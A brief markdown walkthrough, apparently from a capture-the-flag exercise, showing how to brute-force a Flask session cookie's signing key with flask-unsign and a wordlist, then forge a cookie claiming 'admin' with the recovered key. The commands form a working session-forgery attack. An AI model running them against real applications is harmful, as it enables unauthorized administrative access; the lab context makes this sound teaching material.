# Some cookie can be flask-session cookie
## Use flask-unsign tool to crack the cookie secret key
```
flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aZhMXg.H-uhs2XfKMGQl29wuod2jWK_K6w --wordlist most_cookie.txt
```
<img width="1693" height="150" alt="image" src="https://github.com/user-attachments/assets/7806bb0f-550b-40fd-a437-cee42109855b" />

## Import the secret key to print cookie

```
flask-unsign -s -c "{'very auth':'admin'}" -S drop
```
<img width="797" height="83" alt="image" src="https://github.com/user-attachments/assets/1b27c41e-4ed9-498d-9134-343bf06b8399" />
